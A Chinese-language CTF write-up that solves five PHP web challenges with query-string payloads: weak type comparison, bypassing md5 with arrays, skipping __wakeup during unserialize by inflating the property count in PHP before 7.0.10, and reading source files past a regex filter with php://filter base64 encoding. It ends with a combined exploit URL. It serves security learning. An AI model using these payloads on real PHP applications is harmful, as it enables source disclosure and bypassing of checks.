# PHP_Final_Exam

~~世界上最好的语言也要期末考试！~~

因为懒得写前端就把题目藏在源码里了，F12查看网页源码会看到注释提示，网页文件有备份，PHP的主页备份一般就是"index.php.bak"，下载后可以看到源码（要看懂需要一点PHP语言的基础）

## 第一题

看得懂PHP就能直接出，GET传入的"ans1"参数值为"ea5y"即可通过：

```
?ans1=ea5y
```

## 第二题

PHP的弱类型比较，运算符 `==` 是弱类型等于，运算时符号右侧的值先转化为与左侧变量同类型，在比较是否相等。

由于传入的变量只能为整数，因此需要将目标字符串转化为整数类型。字符串转化为数字时，截取左侧的连续数字字符串，并抛弃第一个非数字字符与后面所有的字符，因此字符串转化后就是1357，传入1357即可：

```php
?ans2=1357
```

## 第三题

PHP的 `md5` 函数绕过，md5函数不认识数组，怎么处理结果都是null，因此传入不相等的数组值即可。

php中传入数组的方法是 `?a[]=3` ，该式子定义变量a是数组并添加数组的首个变量为3，因此传入：

```php
?ans3[]=1&_ans3[]=2
```

## 第四题

一道需要利用CVE的反序列化，源码中提供了model类，在析构函数 `__destruct` 中检测该类的"ans"与"stdAns"是否相等，若相等则将第四题类的检测置为1，即第四题得以通过。

因此需要反序列化的类就是model，它有一个 `__wakeup` 函数，该函数总是在该类反序列化之前执行，因此每当该类被反序列化为对象变量时，内部的两个变量会被强行更改为不相等。

源码中的注释提示PHP版本为7.0.9，在版本7.0.10之前，PHP有一个反序列化漏洞，在传入反序列化内容时，如果最外层标记对象内容数量的值比实际内容数量大，则反序列化时不会触发 `__wakeup` 函数

例如以下EXP：

```php
<?php
class model{
    public $stdAns;
    public $ans;
}
$tmp = new model();
$tmp->stdAns="123";
$tmp->ans="123";
echo serialize($tmp);
```

他返回：

```
O:5:"model":2:{s:6:"stdAns";s:3:"123";s:3:"ans";s:3:"123";}
```

表示model是一个类O，它有2个成员变量"stdAns"和"ans"，现在将2改为3，因为大于实际值，因此传入后 `__wakeup` 不会触发，"stdAns"与"ans"相等都为"123"，即可通过第四题的检测。

因此需要传入：

```
?ans4=O:5:"model":3:{s:6:"stdAns";s:3:"123";s:3:"ans";s:3:"123";}
```

## 第五题

PHP的"filter"伪协议利用。

```php
include("secret.php");
$this->secret=$secret;
```

包含了"secret.php"文件后读取其中的"secret"变量，要求我们传入参数与该变量的内容相同即可通过第五题。

include语句相当于将"secret.php"的内容原样放入到该语句的位置，由于php语句会被浏览器解析，因此源码不会被原样显示，而是会被解析处理，文件中的"secret"的变量被读取并赋值，我们的目的是查看"secret.php"的源码内容从而获得"secret"变量的值。

语句：

```php
$prm = $_GET[$prob5->file];
if(!preg_match("/flag|file|data|\\.\\.\\/|^\\/.*/i", $prm)){
    $file = file_get_contents($prm);
} else {
    $file = "No cheat!";
}
// ...
<span class="cot"><?=$file?></span>
```

传入一个文件名后，php会读取对应文件的内容并放到"file"变量中，在HTML源码中其内容被原样输出，由于"secret.php"的内容是php代码，会被解析，因此即使输出出来我们也看不到。

为此要用到"filter"协议，将读取的源码内容进行base64后输出，由于不满足php解析格式，因此是前端可见的：

```
?file=php://filter/convert.base64-encode/resource=secret.php
```

会得到：

```php
PD9waHANCiRzZWNyZXQ9InlvdSBmaW5kIHRoaXMhIjsNCj8+

-> 
<?php
$secret="you find this!";
?>
```

因此最终传入：

```
?ans5=you find this!&file=php://filter/convert.base64-encode/resource=secret.php
```

## 最终Payload

```
?ans1=ea5y&ans2=1357&ans3[]=1&_ans3[]=2&ans4=O:5:"model":3:{s:6:"stdAns";s:3:"123";s:3:"ans";s:3:"123";}&ans5=you%20find%20this!&file=php://filter/convert.base64-encode/resource=secret.php
```